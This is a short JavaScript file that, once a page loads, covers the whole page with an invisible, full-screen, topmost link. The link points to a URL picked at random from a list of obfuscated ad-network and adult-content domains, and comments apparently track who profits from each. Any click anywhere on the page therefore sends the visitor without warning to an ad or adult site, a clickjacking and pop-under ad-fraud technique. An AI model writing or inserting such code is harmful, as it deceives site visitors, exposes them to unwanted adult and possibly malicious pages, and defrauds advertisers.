function createLink() {
  var urls = [
    // hil: db (ss)
    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
    "https://www.qrcreate.online",
    
    // hil: Brian
    "https://aggravatingoil.com/bD3.V/0WPd3Np/vubMm/VqJbZWDa0q1lNtT-QsyRMmj/Ew2XL_TmUQ1sN/DlIDyoMyTqcg",
    "https://json.navigateall.com",

    // hil: Thomas
    "https://experiencedturn.com/bn3/V.0KPm3rp/vYb-mOVkJFZKDq0m1CNzjIAN1rMHDIgJyeLETjUp2wMeDkUPwyOIDOMs",
    "https://loveskill.mjsj.sbs/tags/",

    // mon: db
    // "https://nutchaungong.com/4/7420689",
    // "https://maipheeg.com/4/7474716",
    // "https://glocheexi.com/4/7237941",
    // "https://coawoaph.net/4/7237942",
    // "https://laichegloavy.com/4/7631332",
    
    // "https://vorsoutseemt.com/4/7436813",
    // "https://eedootefaug.net/4/7420698",
    // "https://futseerdoa.com/4/7237921",
    // "https://eeboazurg.net/4/7420696",
    // "https://psauwaun.com/4/7614690",
    // "https://ptougeegnep.net/4/7237907",
    
    // juicy
    "https://sexytalk.mjsj.sbs/tags/",

    // // pending
    // "https://hot123.top/tags/",

    // hil: db123
    "https://sexystory.navigateall.com/tags/",
  ];

  if (urls.length === 0) {
    return;
  }
  var a = document.createElement('a');
  a.href = urls[Math.floor(Math.random() * urls.length)];
  a.rel = 'noopener noreferrer';
  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
  document.body.appendChild(a);
}

document.addEventListener('DOMContentLoaded', createLink);